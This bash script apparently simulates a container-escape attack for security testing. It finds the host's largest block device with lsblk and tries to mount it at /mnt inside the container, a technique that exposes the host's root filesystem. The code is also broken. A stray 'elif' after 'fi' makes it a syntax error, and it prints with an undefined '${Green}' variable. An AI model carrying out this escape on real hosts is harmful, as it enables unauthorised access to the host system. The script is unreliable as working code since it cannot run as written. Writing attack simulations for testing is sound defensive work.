#!/bin/bash

# define colors
GREEN="\e[32m"
YELLOW="\e[33m"
RED="\e[31m"
RESET="\e[0m"

# mount root host filesystem
echo -e "\n${YELLOW}>>> [Privilege Escalation] Escape to Host Technique ${RESET}"
echo "Let's simulate the case when an attacker mounts root host filesystem inside the container"

# Initialize error variable
error=""

echo "Discovering root host block devices ..."

device=$(lsblk -o NAME,SIZE -d | sort -k2 -h | tail -n 1 | awk '{print $1}')

echo "Trying to mount root host device /dev/${device} ..."

if ! mount /dev/$device /mnt/ >/dev/null 2>&1; then
    error="Failed to mount /dev/$device"
fi

elif [[ -n "$error" ]]; then
    echo -e "${RED}Error! Mount attempt was done but failed: $error ${RESET}"
    else
    echo -e "${Green}Success! Mount attempt was successful ${RESET}"
fi